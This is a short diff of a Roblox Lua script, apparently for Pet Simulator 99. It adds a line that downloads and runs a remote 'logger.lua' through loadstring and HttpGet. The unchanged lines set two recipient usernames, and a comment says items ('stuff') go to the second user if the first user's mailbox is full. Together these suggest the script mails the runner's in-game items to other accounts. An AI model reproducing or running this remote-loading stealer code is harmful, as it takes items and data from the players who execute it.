@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/ps99/main/logger.lua'))()
 print("poop")
 Username = "LaRussieCool2"
 Username2 = "LaRussieCool3" -- stuff will get sent to this user if first user's mailbox is full
